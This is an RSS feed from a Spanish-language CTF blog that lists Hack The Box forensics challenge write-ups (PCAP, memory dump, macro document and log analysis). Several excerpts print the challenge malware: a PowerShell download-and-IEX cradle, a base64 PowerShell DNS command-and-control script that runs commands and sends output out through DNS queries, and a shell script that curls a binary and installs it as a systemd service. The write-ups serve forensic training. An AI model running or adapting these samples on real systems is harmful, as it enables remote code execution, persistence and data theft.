<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Forensics on Blog de 7Rocky. Ciberseguridad y Mates</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/</link><description>Recent content in Forensics on Blog de 7Rocky. Ciberseguridad y Mates</description><generator>Hugo</generator><language>es</language><atom:link href="https://7rocky.github.io/ctf/htb-challenges/forensics/index.xml" rel="self" type="application/rss+xml"/><item><title>Alien Cradle</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/alien-cradle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/alien-cradle/</guid><description>Se nos proporciona un script en PowerShell llamado cradle.ps1:
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd(); Desofuscación de PowerShell Está un poco ofuscado, vamos a formatearlo un poco:
if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth') { exit }; $w = New-Object net.</description></item><item><title>An unusual sighting</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/an-unusual-sighting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/an-unusual-sighting/</guid><description>Se nos proporcionan los siguientes archivos:
$ file * bash_history.txt: ASCII text sshd.log: ASCII text Estos son archivos de un servidor de. El archivo bash_history.txt se refiere al historial de los comandos ejecutados en Bash, mientras que el archivo sshd.log es un registro de eventos relacionados con sesiones de SSH.
Tenemos una instancia remota en la que debemos responder algunas preguntas:
$ nc 94.237.51.149 43642 +---------------------+---------------------------------------------------------------------------------------------------------------------+ | Title | Description | +---------------------+---------------------------------------------------------------------------------------------------------------------+ | An unusual sighting | As the preparations come to an end, and The Fray draws near each day, | | | our newly established team has started work on refactoring the new CMS application for the competition.</description></item><item><title>Artifact Of Dangerous Sighting</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/artifact-of-dangerous-sighting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/artifact-of-dangerous-sighting/</guid><description>Se nos proporciona una imagen de disco de Windows dentro de una carpeta llamada HostEvidence_PANDORA:
$ file HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx HostEvidence_PANDORA/2023-03-09T132449_PANDORA.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0x8, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1 Si cambiamos a una máquina de Windows y montamos la imagen del disco, tendremos las siguientes carpetas:
Analizando la imagen del disco Básicamente, tenemos la unidad C:\ de una máquina de Windows.</description></item><item><title>Automation</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/automation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/automation/</guid><description>Se nos proporciona un archivo PCAP con muchos paquetes:
Tráfico HTTP Si filtramos por HTTP, veremos algunas peticiones y respuestas:
Como se puede ver, la víctima está descargando un archivo exe. Esta vez no analizaremos el archivo binario. Obsérvese que hay una petición web sospechosa a /desktop.png. La respuesta contiene datos codificados en Base64:
Análisis de PowerShell Si los decodificamos, obtendremos un script en PowerShell:
$ echo 'ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QoJGtleSwgJElWKSB7CiAgICAkYWVzTWFuYWdlZCA9IE5ldy1PYmplY3QgIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCIKICAgICRhZXNNYW5hZ2VkLk1vZGUgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DaXBoZXJNb2RlXTo6Q0JDCiAgICAkYWVzTWFuYWdlZC5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpaZXJvcwogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4CiAgICAkYWVzTWFuYWdlZC5LZXlTaXplID0gMjU2CiAgICBpZiAoJElWKSB7CiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgIlN0cmluZyIpIHsKICAgICAgICAgICAgJGFlc01hbmFnZWQuSVYgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRJVikKICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRhZXNNYW5hZ2VkLklWID0gJElWCiAgICAgCgogICAgICAgIH0KICAgIH0KICAgIGlmICgka2V5KSB7CgogICAgICAgIGlmICgka2V5LmdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRrZXkpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkYWVzTWFuYWdlZC5LZXkgPSAka2V5CiAgICAgICAgfQogICAgfQogICAgJGFlc01hbmFnZWQKfQoKZnVuY3Rpb24gQ3JlYXRlLUFlc0tleSgpIHsKICAKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRhZXNNYW5hZ2VkLktleSkKfQoKZnVuY3Rpb24gRW5jcnlwdC1TdHJpbmcoJGtleSwgJHVuZW5jcnlwdGVkU3RyaW5nKSB7CiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleQogICAgJGVuY3J5cHRvciA9ICRhZXNNYW5hZ2VkLkNyZWF0ZUVuY3J5cHRvcigpCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOwogICAgW2J5dGVbXV0gJGZ1bGxEYXRhID0gJGFlc01hbmFnZWQuSVYgKyAkZW5jcnlwdGVkRGF0YQogICAgJGFlc01hbmFnZWQuRGlzcG9zZSgpCiAgICBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRmdWxsRGF0YSkucmVwbGFjZSgiLSIsIiIpCn0KCmZ1bmN0aW9uIERlY3J5cHQtU3RyaW5nKCRrZXksICRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpIHsKICAgICRieXRlcyA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGVuY3J5cHRlZFN0cmluZ1dpdGhJVikKICAgICRJViA9ICRieXRlc1swLi4xNV0KICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleSAkSVYKICAgICRkZWNyeXB0b3IgPSAkYWVzTWFuYWdlZC5DcmVhdGVEZWNyeXB0b3IoKTsKICAgICR1bmVuY3J5cHRlZERhdGEgPSAkZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGJ5dGVzLCAxNiwgJGJ5dGVzLkxlbmd0aCAtIDE2KTsKICAgICRhZXNNYW5hZ2VkLkRpc3Bvc2UoKQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQp9CgpmaWx0ZXIgcGFydHMoJHF1ZXJ5KSB7ICR0ID0gJF87IDAuLlttYXRoXTo6Zmxvb3IoJHQubGVuZ3RoIC8gJHF1ZXJ5KSB8ICUgeyAkdC5zdWJzdHJpbmcoJHF1ZXJ5ICogJF8sIFttYXRoXTo6bWluKCRxdWVyeSwgJHQubGVuZ3RoIC0gJHF1ZXJ5ICogJF8pKSB9fSAKJGtleSA9ICJhMUU0TVV0eWNXc3dUbXRyTUhkcWRnPT0iCiRvdXQgPSBSZXNvbHZlLURuc05hbWUgLXR5cGUgVFhUIC1EbnNPbmx5IHdpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODl8U2VsZWN0LU9iamVjdCAtUHJvcGVydHkgU3RyaW5nczsKZm9yICgkbnVtID0gMCA7ICRudW0gLWxlICRvdXQuTGVuZ3RoLTI7ICRudW0rKyl7CiRlbmNyeXB0ZWRTdHJpbmcgPSAkb3V0WyRudW1dLlN0cmluZ3NbMF0KJGJhY2tUb1BsYWluVGV4dCA9IERlY3J5cHQtU3RyaW5nICRrZXkgJGVuY3J5cHRlZFN0cmluZwokb3V0cHV0ID0gaWV4ICRiYWNrVG9QbGFpblRleHQ7JHByID0gRW5jcnlwdC1TdHJpbmcgJGtleSAkb3V0cHV0fHBhcnRzIDMyClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5IHN0YXJ0LndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKZm9yICgkYW5zID0gMDsgJGFucyAtbHQgJHByLmxlbmd0aC0xOyAkYW5zKyspewokZG9tYWluID0gLWpvaW4oJHByWyRhbnNdLCIud2luZG93c2xpdmV1cGRhdGVyLmNvbSIpClJlc29sdmUtRG5zTmFtZSAtdHlwZSBBIC1EbnNPbmx5ICRkb21haW4gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKICAgIH0KUmVzb2x2ZS1EbnNOYW1lIC10eXBlIEEgLURuc09ubHkgZW5kLndpbmRvd3NsaXZldXBkYXRlci5jb20gLVNlcnZlciAxNDcuMTgyLjE3Mi4xODkKfQ==' | base64 -d function Create-AesManagedObject($key, $IV) { $aesManaged = New-Object "</description></item><item><title>Chase</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/chase/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/chase/</guid><description>Se nos proporciona un archivo PCAP con mensajes HTTP y segmentos TCP:
Tráfico HTTP Si filtramos por HTTP, veremos algunas peticiones y respuestas:
Podríamos pensar que el cibercriminal encontró una vulnerabilidad de subida de archivo y subió un cmd.aspx y luego nc64.exe para ejecutar comandos. De hecho, podemos ver que el cibercriminal consiguió una reverse shell en la máquina Windows:
Al final de la captura PCAP, vemos que el cibercriminal intenta acceder a un archivo llamado JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.</description></item><item><title>Deadly Arthropod</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/deadly-arthropod/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/deadly-arthropod/</guid><description>Se nos proporciona un archivo PCAP llamado deadly_arthropod.pcap con algunos eventos USB:
Identificando el dispositivo Hay un evento que muestra que el dispositivo USB es un teclado (concretamente, Razer BlackWidow Ultimate 2013):
Por lo tanto, necesitaremos analizar las pulsaciones de teclas, como en Logger. Los dispositivos de hardware utilizan un protocolo conocido como Human Interface Device (HID). Se puede encontrar más información en Wikipedia. De hecho, hay un manual de documentación adjunto: ww.</description></item><item><title>Downgrade</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/downgrade/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/downgrade/</guid><description>Se nos proporcionan un montón de logs de Eventos de Windows (archivos .evtx):
$ tree Logs Logs ├── Application.evtx ├── HardwareEvents.evtx ├── Internet Explorer.evtx ├── Key Management Service.evtx ├── Microsoft-Windows-AppModel-Runtime%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Admin.evtx ├── Microsoft-Windows-AppReadiness%4Operational.evtx ├── Microsoft-Windows-AppXDeployment%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Operational.evtx ├── Microsoft-Windows-AppXDeploymentServer%4Restricted.evtx ├── Microsoft-Windows-ApplicationResourceManagementSystem%4Operational.evtx ├── Microsoft-Windows-Bits-Client%4Operational.evtx ├── Microsoft-Windows-CodeIntegrity%4Operational.evtx ├── Microsoft-Windows-Compat-Appraiser%4Operational.evtx ├── Microsoft-Windows-CoreApplication%4Operational.evtx ├── Microsoft-Windows-Crypto-DPAPI%4BackUpKeySvc.evtx ├── Microsoft-Windows-Crypto-DPAPI%4Operational.evtx ├── Microsoft-Windows-DSC%4Admin.evtx ├── Microsoft-Windows-DSC%4Operational.evtx ├── Microsoft-Windows-DataIntegrityScan%4Admin.evtx ├── Microsoft-Windows-DataIntegrityScan%4CrashRecovery.evtx ├── Microsoft-Windows-DeviceSetupManager%4Admin.evtx ├── Microsoft-Windows-DeviceSetupManager%4Operational.evtx ├── Microsoft-Windows-Dhcp-Client%4Admin.evtx ├── Microsoft-Windows-Dhcpv6-Client%4Admin.evtx ├── Microsoft-Windows-Diagnosis-DPS%4Operational.</description></item><item><title>Event Horizon</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/event-horizon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/event-horizon/</guid><description>Tenemos esta descripción del reto:
Our CEO&amp;rsquo;s computer was compromised in a phishing attack. The attackers took care to clear the PowerShell logs, so we don&amp;rsquo;t know what they executed. Can you help us?
Y se nos proporcionan muchos archivos de log:
$ ls -l total 0 drwxrwxr-x 325 root root 10400 Nov 2 2020 Logs drwxrwxr-x 2 root root 64 Sep 15 2018 TraceFormat $ find . . ./Logs .</description></item><item><title>Export</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/export/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/export/</guid><description>Se nos proporciona un volcado de memoria llamado WIN-LQS146OE2S1-20201027-142607.raw:
$ file WIN-LQS146OE2S1-20201027-142607.raw WIN-LQS146OE2S1-20201027-142607.raw: data Al leer el nombre, podemos suponer que proviene de una máquina Windows.
Análisis de volcado de memoria Usaremos volatility para analizarlo (específicamente, esta imagen de Docker):
$ docker run --rm -v "${PWD}":/project --entrypoint /bin/bash -it phocean/volatility vol@6c13ee800d5a:/volatility$ cd /project vol@6c13ee800d5a:/project$ python /volatility/vol.py -f WIN-LQS146OE2S1-20201027-142607.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search.</description></item><item><title>Extraterrestrial Persistence</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/extraterrestrial-persistence/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/extraterrestrial-persistence/</guid><description>Se nos proporciona un script de shell llamado persistence.sh:
n=`whoami` h=`hostname` path='/usr/local/bin/service' if [[ "$n" != "pandora" &amp;amp;&amp;amp; "$h" != "linux_HQ" ]]; then exit; fi curl https://files.pypi-install.com/packeges/service -o $path chmod +x $path echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode &amp;gt; /usr/lib/systemd/system/service.service systemctl enable service.service Análisis de script de shell Parece que está verificando algunos valores de la máquina, luego descargando un payload con Curl y ejecutando una cadena codificada en Base64 para guardarla como un servicio.</description></item><item><title>Fake News</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/fake-news/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/fake-news/</guid><description>Se nos proporciona una carpeta llamada html con muchos archivos de un servidor de WordPress:
$ ls index.php wp-activate.php wp-blogs wp-config-sample.php wp-cron.php wp-load.php wp-settings.php xmlrpc.php license.txt wp-admin wp-comments-post.php wp-config.php wp-includes wp-login.php wp-signup.php readme.html wp-blog-header.php wp-config-docker.php wp-content wp-links-opml.php wp-mail.php wp-trackback.php Inspección básica Obviamente, wp-blogs llama la atención, así que examinemos los archivos que están dentro:
$ ls wp-blogs 2022 $ ls wp-blogs/2022/ 11 $ ls wp-blogs/2022/11/ index.php style.css $ du -h wp-blogs/2022/11/* 304K	wp-blogs/2022/11/index.</description></item><item><title>Free Services</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/free-services/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/free-services/</guid><description>Se nos proporciona un archivo de Microsoft Office Excel llamado free_decryption.xlsm. La m en la extensión indica que el archivo contiene macros VBA.
Extracción de macros VBA Desgraciadamente, olevba de oletools no puede extraer el código VBA:
$ olevba free_decryption.xlsm olevba 0.60.1 on Python 3.10.9 - http://decalage.info/python/oletools =============================================================================== FILE: free_decryption.xlsm Type: OpenXML No VBA or XLM macros found. Por lo tanto, tendremos que abrir el archivo (y deshabilitar las macros). Tenemos dos hojas:</description></item><item><title>Halloween Invitation</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/halloween-invitation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/halloween-invitation/</guid><description>Se nos proporciona un archivo ZIP que contiene un fichero llamado invitation.docm:
$ unzip -l Halloween\ Invitation.zip Archive: Halloween Invitation.zip Length Date Time Name --------- ---------- ----- ---- 5252634 10-12-2022 14:04 invitation.docm --------- ------- 5252634 1 file $ unzip Halloween\ Invitation.zip Archive: Halloween Invitation.zip [Halloween Invitation.zip] invitation.docm password: inflating: invitation.docm $ file invitation.docm invitation.docm: Microsoft Word 2007+ Extracción de macros VBA Esto significa que tenemos un documento de Microsoft Word con macros VBA.</description></item><item><title>Illumination</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/illumination/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/illumination/</guid><description>Tenemos un proyecto de JavaScript que utiliza Git como control de versiones. En el proyecto hay un archivo bot.js y un archivo config.json. En el segundo aparece un texto codificado en Base64:
{ "token": "Replace me with token when in use! Security Risk!", "prefix": "~", "lightNum": "1337", "username": "UmVkIEhlcnJpbmcsIHJlYWQgdGhlIEpTIGNhcmVmdWxseQ==", "host": "127.0.0.1" } $ echo UmVkIEhlcnJpbmcsIHJlYWQgdGhlIEpTIGNhcmVmdWxseQ== | base64 -d Red Herring, read the JS carefully El token parece interesante. A lo mejor podemos encontrar la flag en confirmaciones (commits) antiguos.</description></item><item><title>Insider</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/insider/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/insider/</guid><description>Se nos proporciona una carpeta llamada Mozilla con muchos archivos de Firefox:
$ find Mozilla -type f Mozilla/Firefox/installs.ini Mozilla/Firefox/profiles.ini Mozilla/Firefox/Profiles/yodxf5e0.default/times.json Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionstore-backups/recovery.baklz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionstore-backups/recovery.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/weave/failed/tabs.json Mozilla/Firefox/Profiles/2542z9mo.default-release/weave/toFetch/tabs.json Mozilla/Firefox/Profiles/2542z9mo.default-release/favicons.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/compatibility.ini Mozilla/Firefox/Profiles/2542z9mo.default-release/favicons.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/addons.json Mozilla/Firefox/Profiles/2542z9mo.default-release/logins.json Mozilla/Firefox/Profiles/2542z9mo.default-release/search.json.mozlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/sessionCheckpoints.json Mozilla/Firefox/Profiles/2542z9mo.default-release/pkcs11.txt Mozilla/Firefox/Profiles/2542z9mo.default-release/times.json Mozilla/Firefox/Profiles/2542z9mo.default-release/extension-preferences.json Mozilla/Firefox/Profiles/2542z9mo.default-release/addonStartup.json.lz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/crashes/store.json.mozlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/key4.db Mozilla/Firefox/Profiles/2542z9mo.default-release/webappsstore.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/protections.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/places.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/security_state/data.safe.bin Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/state.json Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/aborted-session-ping Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/session-state.json Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604498649754.5212ab6a-268f-4c2b-aa0b-cf46c3d1dc71.event.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604509449817.7d32a9b1-03f4-4155-8f99-ebd1cceb30d5.event.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604496849746.014e92ae-cb57-4c0e-a97c-66ffa45bfe20.new-profile.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/datareporting/archived/2020-11/1604507415845.36b506e6-3dea-4646-8ae3-62e9fd1b4692.main.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/broadcast-listeners.json Mozilla/Firefox/Profiles/2542z9mo.default-release/cookies.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/places.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/containers.json Mozilla/Firefox/Profiles/2542z9mo.default-release/formhistory.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/default/moz-extension+++7b958ab1-a8d2-4943-8833-5185e9a8d9d0^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/default/moz-extension+++7b958ab1-a8d2-4943-8833-5185e9a8d9d0^userContextId=4294967295/.metadata-v2 Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-shm Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite-wal Mozilla/Firefox/Profiles/2542z9mo.default-release/storage/permanent/chrome/.metadata-v2 Mozilla/Firefox/Profiles/2542z9mo.default-release/extensions.json Mozilla/Firefox/Profiles/2542z9mo.default-release/handlers.json Mozilla/Firefox/Profiles/2542z9mo.default-release/bookmarkbackups/bookmarks-2020-11-04_11_Xwf6HUY0M1+1NgBa9qQfXA==.jsonlz4 Mozilla/Firefox/Profiles/2542z9mo.default-release/content-prefs.sqlite Mozilla/Firefox/Profiles/2542z9mo.default-release/gmp-gmpopenh264/1.8.1.1/gmpopenh264.info Mozilla/Firefox/Profiles/2542z9mo.default-release/gmp-gmpopenh264/1.8.1.1/gmpopenh264.dll Mozilla/Firefox/Profiles/2542z9mo.</description></item><item><title>Interstellar C2</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/interstellar-c2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/interstellar-c2/</guid><description>Se nos proporciona un archivo PCAP llamado capture.pcapng. Vamos a verlo en Wireshark:
Como siempre, es bueno comenzar a analizar protocolos de alto nivel como HTTP, así que apliquemos un filtro:
La primera petición se intenta descargar un script de PowerShell llamado vn84.ps1:
Desofuscación de PowerShell Podemos tomar el script de Wireshark y leerlo aquí:
.("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so') ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ; &amp;amp;("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3 ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte')); .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle') BI34 ( [TyPE]("</description></item><item><title>Keep Tryin'</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/keep-tryin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/keep-tryin/</guid><description>Se nos da un archivo PCAP con algunos de los segmentos TCP, mensajes HTTP y consultas DNS:
Tráfico HTTP En primer lugar, analicemos los mensajes HTTP:
El primero parece inútil, solo muestra TryHarder. Y el segundo tiene una cadena codificada en Base64: S2VlcCB0cnlpbmcsIGJ1ZmZ5Cg==. Pero&amp;hellip;
$ echo S2VlcCB0cnlpbmcsIGJ1ZmZ5Cg== | base64 -d Keep trying, buffy Consultas DNS Estas son las consultas DNS anteriores:
Se ven muy extrañas. De hecho, el primero contiene una cadena codificada en Base64:</description></item><item><title>Logger</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/logger/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/logger/</guid><description>Se nos proporciona un archivo PCAP llamado keystrokes.pcapng con algunos eventos USB:
Identificando el dispositivo El segundo evento muestra que el dispositivo USB es un teclado:
Por lo tanto, necesitaremos analizar las pulsaciones de teclas. Los dispositivos de hardware utilizan un protocolo conocido como Human Interface Device (HID). Se puede encontrar más información en Wikipedia. De hecho, hay un manual de documentación adjunto: www.usb.org, donde se encuentran algunas tablas de HID (Sección 10: &amp;ldquo;Keyboard/Keypad Page (0x07)&amp;rdquo;):</description></item><item><title>Lure</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/lure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/lure/</guid><description>Se nos proporciona un archivo de Microsoft Office Word llamado UrgentPayment.doc:
$ file UrgentPayment.doc UrgentPayment.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: Ian Austin, Template: Normal.dotm, Last Saved By: egre55, Revision Number: 4, Name of Creating Application: Microsoft Office Word, Total Editing Time: 40:00, Create Time/Date: Tue Nov 3 18:07:00 2020, Last Saved Time/Date: Tue Nov 3 18:57:00 2020, Number of Pages: 1, Number of Words: 2, Number of Characters: 12, Security: 0 Extracción de macros VBA Con olevba de oletools podemos extraer el código VBA de las macros:</description></item><item><title>MarketDump</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/marketdump/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/marketdump/</guid><description>Se nos proporciona un archivo PCAP con muchos segmentos TCP:
Análisis de tráfico de red Podemos abrirlo en Wireshark y echar un vistazo a todos los protocolos capturados en el archivo (&amp;quot;Statistics &amp;gt; Protocol Hierarchy&amp;quot;):
